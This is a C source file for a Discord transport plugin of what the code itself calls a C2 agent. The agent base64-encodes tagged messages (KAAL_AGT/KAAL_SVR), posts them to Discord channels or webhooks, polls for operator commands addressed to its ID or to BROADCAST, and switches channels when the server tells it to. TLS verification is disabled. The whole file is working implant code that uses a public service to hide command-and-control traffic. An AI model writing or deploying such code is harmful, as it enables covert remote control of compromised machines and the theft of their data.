#ifdef USE_DISCORD

#include "transport.h"
#include <curl/curl.h>
#include <json-c/json.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>


#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#define Sleep(x) usleep((x) * 1000)
#endif

/* Forward declarations of utility functions from agent core (or defined
 * locally) */
extern char *base64_encode(const unsigned char *input, int length);
extern unsigned char *base64_decode(const char *input, int *out_len);

/* Plugin State */
static char discord_token[128] = {0};
static char current_discord_channel[64] = {0};
static char current_discord_webhook[256] = {0};
static char agent_id[64] = {0};
static char last_message_id[32] = {0};

/* cURL write callback */
struct curl_string {
  char *ptr;
  size_t len;
};

static size_t write_callback(void *contents, size_t size, size_t nmemb,
                             void *userp) {
  size_t realsize = size * nmemb;
  struct curl_string *mem = (struct curl_string *)userp;
  mem->ptr = realloc(mem->ptr, mem->len + realsize + 1);
  memcpy(&(mem->ptr[mem->len]), contents, realsize);
  mem->len += realsize;
  mem->ptr[mem->len] = 0;
  return realsize;
}

static int discord_init(const char *config_json) {
  struct json_object *cfg = json_tokener_parse(config_json);
  if (!cfg)
    return -1;

  struct json_object *token_obj, *channel_obj, *agent_id_obj;
  if (json_object_object_get_ex(cfg, "bot_token", &token_obj))
    strncpy(discord_token, json_object_get_string(token_obj),
            sizeof(discord_token) - 1);

  if (json_object_object_get_ex(cfg, "channel_id", &channel_obj))
    strncpy(current_discord_channel, json_object_get_string(channel_obj),
            sizeof(current_discord_channel) - 1);

  if (json_object_object_get_ex(cfg, "agent_id", &agent_id_obj))
    strncpy(agent_id, json_object_get_string(agent_id_obj),
            sizeof(agent_id) - 1);

  json_object_put(cfg);

  curl_global_init(CURL_GLOBAL_ALL);
  return 0;
}

static int discord_send(const unsigned char *data, size_t len) {
  /* Step 1: Wrap in AGENT_ID:payload */
  size_t combo_len = strlen(agent_id) + len + 2;
  char *combined = malloc(combo_len);
  snprintf(combined, combo_len, "%s:%s", agent_id, data);

  /* Step 2: Base64 Encode */
  char *b64 = base64_encode((unsigned char *)combined, strlen(combined));

  /* Step 3: Prepend KAAL_AGT: */
  char *discord_msg = malloc(strlen(b64) + 16);
  sprintf(discord_msg, "KAAL_AGT:%s", b64);

  free(b64);
  free(combined);

  /* Step 4: Send via Discord REST (with retries & fallback) */
  int max_retries = 5;
  for (int attempt = 0; attempt < max_retries; attempt++) {
    CURL *curl = curl_easy_init();
    if (!curl) {
      free(discord_msg);
      return -1;
    }

    char url[512];
    struct curl_slist *headers = NULL;

    if (strlen(current_discord_webhook) > 0) {
      snprintf(url, sizeof(url), "%s", current_discord_webhook);
      headers = curl_slist_append(headers, "Content-Type: application/json");
    } else {
      snprintf(url, sizeof(url),
               "https://discord.com/api/v10/channels/%s/messages",
               current_discord_channel);
      char auth_header[256];
      snprintf(auth_header, sizeof(auth_header), "Authorization: Bot %s",
               discord_token);
      headers = curl_slist_append(headers, auth_header);
      headers = curl_slist_append(headers, "Content-Type: application/json");
    }

    struct json_object *payload_obj = json_object_new_object();
    json_object_object_add(payload_obj, "content",
                           json_object_new_string(discord_msg));
    const char *payload_str = json_object_to_json_string(payload_obj);

    struct curl_string response;
    response.ptr = malloc(1);
    response.len = 0;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload_str);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    if (res == CURLE_OK) {
      curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    }

    json_object_put(payload_obj);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK) {
      free(response.ptr);
      free(discord_msg);
      return -1;
    }

    if (http_code == 429) {
      double retry_after = 1.0;
      struct json_object *parsed_429 = json_tokener_parse(response.ptr);
      if (parsed_429) {
        struct json_object *ra_obj;
        if (json_object_object_get_ex(parsed_429, "retry_after", &ra_obj)) {
          retry_after = json_object_get_double(ra_obj);
        }
        json_object_put(parsed_429);
      }
      free(response.ptr);
      int sleep_ms = (int)(retry_after * 1000.0) + 200;
      Sleep(sleep_ms);
      continue; /* retry */
    }

    if (http_code != 200 && http_code != 204) {
      if (http_code == 404 && strlen(current_discord_webhook) > 0) {
        /* Webhook 404 Fallback */
        current_discord_webhook[0] = '\0';

        /* Reset channel to #general using config */
        /* Assuming the original shared channel is available, but for now we
           won't reset it here, the C2 will realize we are back on general if we
           re-read the config or we just send there. For simplicity, if we lose
           the webhook, we also lose the dynamic channel so we should probably
           revert to the bot channel. We will just clear the webhook for now
           which makes us fall back to whatever current_discord_channel is set
           to (which might also 404 if deleted!). Actually, if the channel is
           deleted, Discord returns 404 for channel /messages too. If we get 404
           on channel, we are stuck until we restart or we have a hardcoded
           fallback. We'll leave the existing fallback logic we built earlier
           here. */
        last_message_id[0] = '\0';
        free(response.ptr);
        continue;
      }
    }

    free(response.ptr);
    free(discord_msg);
    return (http_code == 200 || http_code == 204) ? 0 : -1;
  }

  free(discord_msg);
  return -1;
}

static int discord_recv(unsigned char *buffer, size_t *len, int timeout_ms) {
  CURL *curl = curl_easy_init();
  if (!curl)
    return -1;

  char url[256];
  snprintf(url, sizeof(url),
           "https://discord.com/api/v10/channels/%s/messages?limit=10",
           current_discord_channel);
  if (last_message_id[0]) {
    strcat(url, "&after=");
    strcat(url, last_message_id);
  }

  struct curl_slist *headers = NULL;
  char auth_header[256];
  snprintf(auth_header, sizeof(auth_header), "Authorization: Bot %s",
           discord_token);
  headers = curl_slist_append(headers, auth_header);

  struct curl_string response;
  response.ptr = malloc(1);
  response.len = 0;

  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
  curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, (long)timeout_ms);
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

  CURLcode res = curl_easy_perform(curl);
  curl_easy_cleanup(curl);
  curl_slist_free_all(headers);

  if (res != CURLE_OK) {
    free(response.ptr);
    return -1;
  }

  struct json_object *parsed = json_tokener_parse(response.ptr);
  if (!parsed) {
    free(response.ptr);
    return 0; // Timeout/No JSON
  }

  if (!json_object_is_type(parsed, json_type_array)) {
    json_object_put(parsed);
    free(response.ptr);
    return 0;
  }

  int array_len = json_object_array_length(parsed);
  char *command = NULL;

  for (int i = 0; i < array_len; i++) {
    struct json_object *msg = json_object_array_get_idx(parsed, i);
    struct json_object *content_obj, *id_obj;
    if (!json_object_object_get_ex(msg, "content", &content_obj))
      continue;
    if (!json_object_object_get_ex(msg, "id", &id_obj))
      continue;

    const char *content = json_object_get_string(content_obj);
    const char *msg_id = json_object_get_string(id_obj);

    strncpy(last_message_id, msg_id, sizeof(last_message_id) - 1);

    if (strncmp(content, "KAAL_SVR:", 9) == 0) {
      const char *b64 = content + 9;
      int decoded_len;
      unsigned char *decoded = base64_decode(b64, &decoded_len);
      if (!decoded)
        continue;

      char *dec_str = (char *)decoded;
      char *colon = strchr(dec_str, ':');
      if (!colon) {
        free(decoded);
        continue;
      }
      *colon = 0;

      if (strcmp(dec_str, agent_id) == 0 || strcmp(dec_str, "BROADCAST") == 0) {
        char *payload_json = colon + 1;

        /* Check for channel adoption inside payload */
        struct json_object *payload_obj = json_tokener_parse(payload_json);
        if (payload_obj) {
          struct json_object *type_obj;
          if (json_object_object_get_ex(payload_obj, "type", &type_obj)) {
            const char *p_type = json_object_get_string(type_obj);
            if (strcmp(p_type, "registered") == 0) {
              /* Update local agent_id to the server-assigned GUID */
              struct json_object *new_id_obj;
              if (json_object_object_get_ex(payload_obj, "agent_id", &new_id_obj)) {
                const char *new_guid = json_object_get_string(new_id_obj);
                if (new_guid && strcmp(agent_id, new_guid) != 0) {
                  strncpy(agent_id, new_guid, sizeof(agent_id)-1);
                }
              }

              struct json_object *transport_obj;
              if (json_object_object_get_ex(payload_obj, "transport_id",
                                            &transport_obj)) {
                const char *new_channel = json_object_get_string(transport_obj);
                if (new_channel &&
                    strcmp(new_channel, current_discord_channel) != 0) {
                  strncpy(current_discord_channel, new_channel,
                          sizeof(current_discord_channel) - 1);
                  last_message_id[0] = '\0';
                  /* VERIFIED HANDSHAKE: Send immediate heartbeat to PROVE adoption to the profile */
                  discord_send((const unsigned char *)"{\"type\":\"heartbeat\"}", 19);
                }
              }
              struct json_object *hook_obj;
              if (json_object_object_get_ex(payload_obj, "webhook_url",
                                            &hook_obj)) {
                const char *new_webhook = json_object_get_string(hook_obj);
                if (new_webhook &&
                    strcmp(new_webhook, current_discord_webhook) != 0) {
                  strncpy(current_discord_webhook, new_webhook,
                          sizeof(current_discord_webhook) - 1);
                }
              }
            }
          }
          /* If it is just a 'registered' message, we might just consume it, but
             let's pass it up so the core knows registration succeeded. */
          json_object_put(payload_obj);
        }

        size_t payload_len = strlen(payload_json);
        if (payload_len < *len) {
          memcpy(buffer, payload_json, payload_len + 1);
          *len = payload_len;
          command = (char *)buffer; // just a non-null marker
        } else {
          *len = 0; // buffer too small
        }

        free(decoded);
        break;
      }
      free(decoded);
    }
  }

  json_object_put(parsed);
  free(response.ptr);

  return (command != NULL) ? 1 : 0;
}

static void discord_shutdown(void) { curl_global_cleanup(); }

transport_t transport_discord = {.init = discord_init,
                                 .send = discord_send,
                                 .recv = discord_recv,
                                 .shutdown = discord_shutdown};

#endif // USE_DISCORD
